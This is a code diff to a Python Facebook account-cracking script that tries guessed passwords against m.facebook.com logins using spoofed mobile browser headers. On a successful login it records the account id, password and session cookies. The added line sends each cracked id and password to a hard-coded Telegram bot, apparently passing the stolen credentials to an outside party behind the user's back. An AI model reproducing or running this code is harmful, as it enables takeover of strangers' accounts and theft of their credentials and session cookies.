@@ -1071,14 +1071,9 @@ def crackmobile_ARA(idf,pwv,nmf):
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
     'dpr': '2.75',
-    'referer': 'https://m.facebook.com/bookmarks/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-ch-ua-platform': '"iOS"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
@@ -1086,8 +1081,7 @@ def crackmobile_ARA(idf,pwv,nmf):
     'upgrade-insecure-requests': '1',
     'user-agent': ua,
     'viewport-width': '980',
-}
-			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+}			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=1.75; wd=412x814'
@@ -1096,14 +1090,9 @@ def crackmobile_ARA(idf,pwv,nmf):
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
     'dpr': '2.75',
-    'referer': 'https://m.facebook.com/bookmarks/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua': '"Google Chrome";v="87", "Chromium";v="87", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-ch-ua-platform': '"iOS"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
@@ -1124,6 +1113,7 @@ def crackmobile_ARA(idf,pwv,nmf):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				requests.get(f"https://api.telegram.org/bot7291662040:AAHdeqNUm62e-VlWLjnYL3seA9qgMkABHj4/sendMessage?chat_id=7155363713&text=\r {idf} | {pw}")
 				print(f'\r{a2}[RaWa-OK✔]{a23}{idf}{a6}|{a1}{pw}{a11}\n {a17}Cookis🤍 {kuki}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_ARA(kuki)
